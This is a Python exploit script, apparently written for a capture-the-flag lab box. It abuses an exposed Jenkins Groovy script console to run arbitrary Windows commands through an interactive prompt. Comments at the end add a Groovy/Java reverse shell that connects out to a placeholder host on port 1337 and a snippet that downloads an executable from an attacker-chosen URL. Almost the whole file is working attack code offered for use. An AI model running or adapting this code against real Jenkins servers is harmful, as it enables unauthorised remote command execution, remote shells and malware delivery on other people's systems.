import requests

"""
EDIT VALUES BETWEEN THESE LINES TO SUITE YOUR NEEDS
"""
PROXY = None  # Proxy to use, ex: 127.0.0.1:80
TARGET = 'http://10.10.10.63:50000'  # Target address and port
URI = '/askjeeves/script'  # Path to Jenkins application script page
"""
END VALUES TO EDIT
"""

TARGET = TARGET.lower()
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.10.63:50000/askjeeves/script'
}

request_template = '''POST /askjeeves/script HTTP/1.1
                    Host: {0}
                    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                    Accept-Language: en-US,en;q=0.5
                    Accept-Encoding: gzip, deflate
                    Referer: {1}{2}
                    Cookie: screenResolution=2208x1278; JSESSIONID.6fd2bc68=node0ui7r6j814dn91f88dkvig2yly1.node0
                    Connection: close
                    Upgrade-Insecure-Requests: 1
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 688

                    script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd+%2Fc+#COMMAND#%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&Jenkins-Crumb=bc4f7b806059dd65cbe61482e98071b0&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd+%2Fc+dir%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%3E+%24sout+err%3E+%24serr%5C%22%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22bc4f7b806059dd65cbe61482e98071b0%22%7D&Submit=Run
                    '''.format(TARGET.replace("http://", "").replace("https://", ""), TARGET, URI)

def BuildRequest(command):
    payload = {
        'script': '''def sout = new StringBuffer(), serr = new StringBuffer()
                     def proc = 'cmd /c #COMMAND#'.execute()
                     proc.consumeProcessOutput(sout, serr)
                     proc.waitForOrKill(1000)
                     println "#STARTOUT# $sout #ENDOUT# #STARTERR# $serr #ENDERR#"'''.replace('#COMMAND#', command),
        'Jenkins-Crumb': 'bc4f7b806059dd65cbe61482e98071b0',
        'json': """{"script": "def sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = 'cmd /c #COMMAND#'.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln \"#STARTOUT# $sout #ENDOUT# #STARTERR# $serr #ENDERR#\"", "": "", "Jenkins-Crumb": "bc4f7b806059dd65cbe61482e98071b0"}""".replace(
            '#COMMAND#', command),
        'Submit': 'Run'
    }
    return payload

def ExecuteCommand(command):
    payload = BuildRequest(command)
    uri = TARGET + URI
    if PROXY is None:
        result = requests.post(uri, payload, timeout=5).text.strip()
    else:
        result = requests.post(uri, payload, timeout=5, proxies={'http': PROXY}).text.strip()
    start = result.find('</h2><pre>#STARTOUT#') + 10
    end = result.find('#ENDOUT#', start)
    starterr = result.find('#STARTERR#', end) + 10
    enderr = result.find('#ENDERR#', starterr)
    return result[start:end] + '\n' + result[starterr:enderr]

if __name__ == '__main__':
    while True:
        command = input('> ')
        result = ExecuteCommand(command)
        print(result)

"""
Additional code examples to be integrated for popping a reverse shell or for sending files
"""

# Create a reverse shell
#     String host="1.2.3.4";
#     int port=1337;
#     String cmd="cmd.exe";
#     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Example groovy script for downloading a file
#     def file = new FileOutputStream("filename_to_save_as.exe")
#     def out = new BufferedOutputStream(file)
#     out << new URL("http://yourlocalip:localport/filename.exe").openStream()
#     out.close()
